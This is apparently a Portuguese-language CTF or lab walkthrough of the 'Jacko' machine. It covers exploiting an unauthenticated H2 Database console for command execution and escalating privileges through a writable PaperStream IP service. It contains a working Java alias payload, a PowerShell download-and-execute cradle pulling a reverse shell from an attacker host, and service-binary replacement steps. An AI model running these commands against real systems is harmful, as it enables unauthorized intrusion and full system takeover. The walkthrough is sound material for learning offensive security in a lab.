# Jacko
> H2 Database + PaperStream

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

Porta 8082 com H2 Database Console acessível.

## Exploração

H2 Console sem autenticação. Execução de comandos via JDBC:

```
CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {"cmd.exe", "/c", cmd}; Process proc = rt.exec(commands); return "done"; } $$;
CALL EXEC('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<IP>/shell.ps1'')"');
```

Reverse shell obtido.

## Escalada de Privilégio

PaperStream IP instalado. Versão vulnerável a escalada local:

```
.\winPEAS.exe
```

```
# explorar serviço PaperStream com permissão de escrita
sc stop PaperStream
copy malicious.exe "C:\Program Files\PFU\PaperStream IP\..."
sc start PaperStream
```

SYSTEM obtido.
